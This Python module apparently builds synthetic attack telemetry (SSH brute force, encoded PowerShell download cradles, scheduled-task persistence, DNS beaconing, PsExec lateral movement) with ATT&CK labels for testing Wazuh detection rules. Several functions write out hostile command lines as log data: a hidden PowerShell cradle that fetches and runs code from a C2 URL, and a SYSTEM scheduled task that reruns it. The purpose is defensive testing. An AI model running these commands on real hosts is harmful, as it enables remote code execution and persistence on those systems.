"""Scenario builders: turn a playbook's params into correlated log events.

Each builder appends events (via emitters) and ground-truth labels to the
Timeline, all offset from ``start`` (seconds into the generation window). Events
within a scenario share host / user / src-IP so correlation rules can fire.

expected_rules on the ground-truth labels list the *built-in* Wazuh rules that
should fire today; the custom composite rule IDs (100xxx) are added to the
playbooks in Phase 3/4 once those rules exist.
"""
from __future__ import annotations

import base64
from functools import partial
from urllib.parse import urlsplit

from emitters import suricata, sshd, windows
from timeline import Timeline
from world import World

# Usernames an SSH brute-force sprays before landing on a real account.
_SPRAY_USERS = ["root", "admin", "test", "oracle", "postgres", "ubuntu", "git", "user"]

# .NET / PowerShell download-cradle user agent (Net.WebClient sends this family).
_PS_UA = "Mozilla/5.0 (Windows NT 10.0; WOW64) WindowsPowerShell/5.1.19041.1"


def _psencode(command: str) -> str:
    """Mimic PowerShell -EncodedCommand (UTF-16LE then base64)."""
    return base64.b64encode(command.encode("utf-16-le")).decode("ascii")


def brute_force_success(cfg: dict, world: World, tl: Timeline, start: float) -> None:
    p = cfg["params"]
    name = cfg["name"]
    rng = world.rng
    host = p["target_host"]
    valid_user = p["target_valid_user"]
    src_ip = p["src_ip"]
    n = int(p["failed_attempts"])
    interval = float(p["attempt_interval_seconds"])
    jitter = float(p["jitter_seconds"])
    pid = world.pid()

    off = start
    for _ in range(n):
        # Mostly non-existent users, occasionally the real account with a bad password.
        if rng.random() < 0.2:
            user, render = valid_user, sshd.failed_password
        else:
            user, render = rng.choice(_SPRAY_USERS), sshd.failed_invalid_user
        tl.emit(off, "auth.log", partial(
            render, host=host, user=user, src_ip=src_ip, port=rng.randint(30000, 65000), pid=pid))
        off += max(0.5, interval + rng.uniform(-jitter, jitter))

    tl.label(start, technique_id="T1110", tactic="Credential Access", scenario=name,
             host=host, source="sshd", src_ip=src_ip,
             expected_rules=p.get("expected_rules_bruteforce", []),
             note=f"{n} failed SSH auth attempts in a burst from {src_ip}")

    off += rng.uniform(1.0, 5.0)
    tl.emit(off, "auth.log", partial(
        sshd.accepted_password, host=host, user=valid_user, src_ip=src_ip,
        port=rng.randint(30000, 65000), pid=pid))
    tl.label(off, technique_id="T1078", tactic="Initial Access", scenario=name,
             host=host, source="sshd", src_ip=src_ip,
             expected_rules=p.get("expected_rules_success", []),
             note=f"successful login as {valid_user} from the brute-force source IP")


def powershell_cradle(cfg: dict, world: World, tl: Timeline, start: float) -> None:
    p = cfg["params"]
    name = cfg["name"]
    rng = world.rng
    host = p["host"]
    user = p["user"]
    parent_image = p["parent_image"]
    cradle = f"IEX (New-Object Net.WebClient).DownloadString('{p['c2_url']}')"
    command_line = f"powershell.exe -NoP -NonI -W Hidden -Enc {_psencode(cradle)}"

    ps_guid = world.guid()
    ps_pid = world.pid()
    tl.emit(start, "windows_events.json", partial(
        windows.sysmon_process_create,
        computer=host, record_id=world.record_id(), image=windows.POWERSHELL,
        command_line=command_line, parent_image=parent_image,
        parent_command_line=f'"{parent_image}" /n', user=user,
        process_guid=ps_guid, parent_process_guid=world.guid(),
        process_id=ps_pid, parent_process_id=world.pid()))

    tl.label(start, technique_id="T1059.001", tactic="Execution", scenario=name,
             host=host, source="sysmon", expected_rules=p.get("expected_rules", []),
             note="encoded PowerShell spawned by an Office process")

    u = urlsplit(p["c2_url"])
    # Endpoint view of the download: the SAME PowerShell process (processGuid)
    # opens an outbound connection to the C2 — lets us correlate to the execution.
    off_net = start + rng.uniform(1.0, 2.0)
    tl.emit(off_net, "windows_events.json", partial(
        windows.sysmon_network_connection,
        computer=host, record_id=world.record_id(), process_guid=ps_guid, process_id=ps_pid,
        image=windows.POWERSHELL, user=user, source_ip=world.ip_of(host),
        source_port=rng.randint(40000, 60000), dest_ip=u.hostname, dest_port=u.port or 80,
        dest_hostname=u.hostname))

    # Network-sensor view of the same fetch: the HTTP GET of the second stage.
    off = start + rng.uniform(2.0, 3.5)
    tl.emit(off, "eve.json", partial(
        suricata.http_request, src_ip=world.ip_of(host), dest_ip=u.hostname,
        hostname=u.hostname, url=u.path or "/", dest_port=u.port or 80,
        src_port=rng.randint(40000, 60000), user_agent=_PS_UA,
        status=200, length=rng.randint(20000, 90000)))
    tl.label(off, technique_id="T1105", tactic="Command and Control", scenario=name,
             host=host, source="suricata+sysmon",
             expected_rules=[100310, 100430],
             note=f"download of {p['c2_url']} — Suricata HTTP (100310) + exec-correlated "
                  f"endpoint connection (100430)")


def scheduled_task(cfg: dict, world: World, tl: Timeline, start: float) -> None:
    p = cfg["params"]
    name = cfg["name"]
    host = p["host"]
    user = p["user"]
    task_name = p["task_name"]
    domain, _, sam = user.partition("\\")
    if not sam:
        domain, sam = "CORP", user

    beacon = f"IEX (New-Object Net.WebClient).DownloadString('{p['c2_url']}')"
    payload = f"powershell.exe -NoP -W Hidden -Enc {_psencode(beacon)}"
    schtasks_cmd = (f'schtasks.exe /Create /F /SC MINUTE /MO 5 /TN "{task_name}" '
                    f'/TR "{payload}" /RU SYSTEM')

    # 1) the schtasks.exe process that creates the task (Sysmon 1)
    tl.emit(start, "windows_events.json", partial(
        windows.sysmon_process_create,
        computer=host, record_id=world.record_id(), image=windows.SCHTASKS,
        command_line=schtasks_cmd, parent_image=windows.POWERSHELL,
        parent_command_line="powershell.exe -NoP -NonI", user=user,
        process_guid=world.guid(), parent_process_guid=world.guid(),
        process_id=world.pid(), parent_process_id=world.pid()))

    # 2) the Security 4698 the OS logs when the task is registered
    task_xml = (
        "<Task><Triggers><TimeTrigger><Repetition>"
        "<Interval>PT5M</Interval></Repetition></TimeTrigger></Triggers>"
        f"<Actions><Exec><Command>powershell.exe</Command>"
        f"<Arguments>-NoP -W Hidden -Enc ...</Arguments></Exec></Actions></Task>")
    tl.emit(start + 0.4, "windows_events.json", partial(
        windows.security_scheduled_task_created,
        computer=host, record_id=world.record_id(), subject_user=sam,
        subject_domain=domain, task_name=task_name, task_content=task_xml))

    tl.label(start, technique_id="T1053.005", tactic="Persistence", scenario=name,
             host=host, source="sysmon+security", expected_rules=p.get("expected_rules", []),
             note=f"scheduled task {task_name} launching encoded PowerShell every 5 min")


def dns_beacon(cfg: dict, world: World, tl: Timeline, start: float) -> None:
    p = cfg["params"]
    name = cfg["name"]
    rng = world.rng
    host = p["src_host"]
    src_ip = world.ip_of(host)
    resolver = p["resolver_ip"]
    c2 = p["c2_domain"]
    interval = float(p["interval_seconds"])
    jitter = float(p["jitter_seconds"])
    beacons = int(p["beacons"])

    off = start
    for _ in range(beacons):
        # Unique high-entropy subdomain per beacon (encoded C2 data), one parent domain.
        label = "".join(rng.choice("0123456789abcdef") for _ in range(rng.randint(16, 28)))
        tl.emit(off, "eve.json", partial(
            suricata.dns_query, src_ip=src_ip, dest_ip=resolver,
            rrname=f"{label}.{c2}", rrtype="TXT",
            src_port=rng.randint(40000, 60000), tx_id=rng.randint(1, 65535)))
        off += max(1.0, interval + rng.uniform(-jitter, jitter))

    tl.label(start, technique_id="T1071.004", tactic="Command and Control", scenario=name,
             host=host, source="suricata", src_ip=src_ip,
             expected_rules=p.get("expected_rules", []),
             note=f"{beacons} regular-interval DNS TXT queries to *.{c2}")


def exec_to_persistence(cfg: dict, world: World, tl: Timeline, start: float) -> None:
    """Tight execution -> persistence chain on one host (feeds rule 100420)."""
    p = cfg["params"]
    name = cfg["name"]
    host = p["host"]
    user = p["user"]
    gap = float(p.get("gap_seconds", 8))
    domain, _, sam = user.partition("\\")
    if not sam:
        domain, sam = "CORP", user

    # Step 1: encoded PowerShell (execution) spawned by an Office process.
    cradle = f"IEX (New-Object Net.WebClient).DownloadString('{p['c2_url']}')"
    ps_cmd = f"powershell.exe -NoP -NonI -W Hidden -Enc {_psencode(cradle)}"
    ps_guid = world.guid()
    tl.emit(start, "windows_events.json", partial(
        windows.sysmon_process_create,
        computer=host, record_id=world.record_id(), image=windows.POWERSHELL,
        command_line=ps_cmd, parent_image=p["parent_image"],
        parent_command_line=f'"{p["parent_image"]}" /n', user=user,
        process_guid=ps_guid, parent_process_guid=world.guid(),
        process_id=world.pid(), parent_process_id=world.pid()))
    tl.label(start, technique_id="T1059.001", tactic="Execution", scenario=name,
             host=host, source="sysmon", expected_rules=p.get("expected_rules_exec", []),
             note="encoded PowerShell (kill-chain step 1: execution)")

    # Step 2: that PowerShell registers a scheduled task (persistence).
    off = start + gap
    payload = f"powershell.exe -NoP -W Hidden -Enc {_psencode(cradle)}"
    schtasks_cmd = (f'schtasks.exe /Create /F /SC MINUTE /MO 5 /TN "{p["task_name"]}" '
                    f'/TR "{payload}" /RU SYSTEM')
    tl.emit(off, "windows_events.json", partial(
        windows.sysmon_process_create,
        computer=host, record_id=world.record_id(), image=windows.SCHTASKS,
        command_line=schtasks_cmd, parent_image=windows.POWERSHELL,
        parent_command_line=ps_cmd, user=user,
        process_guid=world.guid(), parent_process_guid=ps_guid,
        process_id=world.pid(), parent_process_id=world.pid()))
    task_xml = (
        "<Task><Triggers><TimeTrigger><Repetition><Interval>PT5M</Interval>"
        "</Repetition></TimeTrigger></Triggers><Actions><Exec>"
        "<Command>powershell.exe</Command><Arguments>-NoP -W Hidden -Enc ...</Arguments>"
        "</Exec></Actions></Task>")
    tl.emit(off + 0.4, "windows_events.json", partial(
        windows.security_scheduled_task_created,
        computer=host, record_id=world.record_id(), subject_user=sam,
        subject_domain=domain, task_name=p["task_name"], task_content=task_xml))
    tl.label(off, technique_id="T1053.005", tactic="Persistence", scenario=name,
             host=host, source="sysmon+security", expected_rules=p.get("expected_rules_persist", []),
             note="scheduled-task persistence right after execution (kill-chain step 2)")


def lateral_movement(cfg: dict, world: World, tl: Timeline, start: float) -> None:
    """PsExec lateral movement: SMB connection to a target where PSEXESVC spawns a shell."""
    p = cfg["params"]
    name = cfg["name"]
    rng = world.rng
    src = p["source_host"]
    tgt = p["target_host"]
    user = p["admin_user"]
    psexec = r"C:\PSTools\PsExec64.exe"
    psexesvc = r"C:\Windows\PSEXESVC.exe"

    # 1) SMB connection from the foothold to the target's admin share (context).
    tl.emit(start, "windows_events.json", partial(
        windows.sysmon_network_connection,
        computer=src, record_id=world.record_id(), process_guid=world.guid(),
        process_id=world.pid(), image=psexec, user=user, source_ip=world.ip_of(src),
        source_port=rng.randint(40000, 60000), dest_ip=world.ip_of(tgt), dest_port=445,
        dest_hostname=tgt))

    # 2) PSEXESVC service starts on the target.
    svc_guid = world.guid()
    off = start + rng.uniform(0.5, 1.5)
    tl.emit(off, "windows_events.json", partial(
        windows.sysmon_process_create,
        computer=tgt, record_id=world.record_id(), image=psexesvc,
        command_line=f'"{psexesvc}"', parent_image=r"C:\Windows\System32\services.exe",
        parent_command_line=r"C:\Windows\System32\services.exe", user="NT AUTHORITY\\SYSTEM",
        process_guid=svc_guid, parent_process_guid=world.guid(),
        process_id=world.pid(), parent_process_id=world.pid()))

    # 3) the remotely executed command (child of PSEXESVC) -- the detection point.
    off2 = off + rng.uniform(0.3, 1.0)
    tl.emit(off2, "windows_events.json", partial(
        windows.sysmon_process_create,
        computer=tgt, record_id=world.record_id(), image=r"C:\Windows\System32\cmd.exe",
        command_line='cmd.exe /c whoami & ipconfig /all & net group "Domain Admins" /domain',
        parent_image=psexesvc, parent_command_line=f'"{psexesvc}"', user=user,
        process_guid=world.guid(), parent_process_guid=svc_guid,
        process_id=world.pid(), parent_process_id=world.pid()))
    tl.label(off2, technique_id="T1021.002", tactic="Lateral Movement", scenario=name,
             host=tgt, source="sysmon", expected_rules=p.get("expected_rules", []),
             note=f"PsExec remote command execution on {tgt} from {src}")


BUILDERS = {
    "brute_force_success": brute_force_success,
    "powershell_cradle": powershell_cradle,
    "scheduled_task": scheduled_task,
    "dns_beacon": dns_beacon,
    "exec_to_persistence": exec_to_persistence,
    "lateral_movement": lateral_movement,
}
